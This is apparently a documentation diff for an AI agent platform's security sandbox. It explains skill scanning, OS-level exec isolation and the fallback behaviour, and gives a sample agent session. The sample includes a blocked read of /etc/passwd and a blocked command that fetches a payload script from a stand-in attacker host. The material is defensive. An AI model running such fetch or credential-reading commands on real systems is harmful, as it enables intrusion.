@@ -6,6 +6,23 @@ icon: "box"
 
 When you add custom skills to your agents -- prompt templates, MCP integrations, or third-party tools -- Comis runs them through multiple layers of protection. Before a skill loads, its content is scanned for threats. Before it executes, dangerous patterns are sanitized. During execution, tool access is restricted to only what the skill needs. This multi-layer approach means even a compromised skill cannot harm your system.
 
+<Note>
+**Two different sandboxes.** Comis has two distinct sandbox concepts that are
+sometimes conflated:
+
+- **Skill sandbox** (this page) -- *application-level* protection that runs
+  whenever a skill is loaded or invoked: content scanning, sanitization, tool
+  policy, budget caps. This applies to **all** skills regardless of how they
+  execute.
+- **Exec sandbox** ([separate page](/security/exec-sandbox)) -- *OS-level*
+  filesystem isolation for the `system.exec` tool only, using bubblewrap on
+  Linux or sandbox-exec on macOS. It does **not** sandbox arbitrary agent
+  code, MCP servers, or in-process Node tools.
+
+Use this page for skill loading and tool-policy questions; use the Exec
+Sandbox page for shell-command isolation.
+</Note>
+
 ## What the Sandbox Protects Against
 
 The sandboxing system is designed to catch a range of threats:
@@ -83,6 +100,48 @@ Skills pass through four layers of protection before and during execution. Each 
     For budget and circuit breaker configuration, see [Safety](/agents/safety).
   </Step>
 </Steps>
+
+## OS-Level Filesystem Sandbox (Exec Tool)
+
+For the special case of the `system.exec` tool, which spawns a shell, the
+skill-level layers above are reinforced by a kernel-enforced filesystem
+namespace. This is the **only** Comis sandbox that operates at the OS level.
+
+| Platform | Provider | Mechanism |
+|----------|----------|-----------|
+| Linux | [bubblewrap](https://github.com/containers/bubblewrap) (`bwrap`) | Mount, PID, user, IPC, and cgroup namespaces; private /tmp; `--die-with-parent` |
+| macOS | `sandbox-exec` (built-in) | SBPL profile generated per invocation; default-deny; symlink-aware paths |
+
+The provider is **auto-detected** at daemon startup -- Comis picks bwrap on
+Linux and sandbox-exec on macOS. If the binary is missing, the exec tool
+logs a warning and falls back to running unsandboxed (you can change this to
+hard-fail by setting `execSandbox.enabled: "always"` and ensuring the binary
+is installed).
+
+### Successful exec call vs blocked exec call
+
+Here is what an agent sees when it tries to read a permitted vs forbidden
+path through the exec tool. The agent's workspace lives at
+`~/.comis/workspace-code-assistant/`.
+
+```bash
+# ALLOWED -- inside the workspace, sandbox mounts it read-write
+$ exec command="cat README.md"
+# Comis README. Welcome to the agent workspace...
+
+# BLOCKED -- outside the workspace, sandbox does not mount /etc
+$ exec command="cat /etc/passwd"
+# bash: /etc/passwd: No such file or directory
+# (the file exists on the host, but it is invisible inside the namespace)
+
+# BLOCKED before the sandbox even runs -- ExecSecurityValidator rejects
+# shell substitution
+$ exec command='echo $(curl https://evil.example.com/payload.sh)'
+# Error: dangerous shell pattern detected: command substitution $(...)
+```
+
+For the full exec sandbox configuration, mount table, and platform notes,
+see [Exec Sandbox](/security/exec-sandbox).
 
 ## What Happens When a Threat Is Found
 
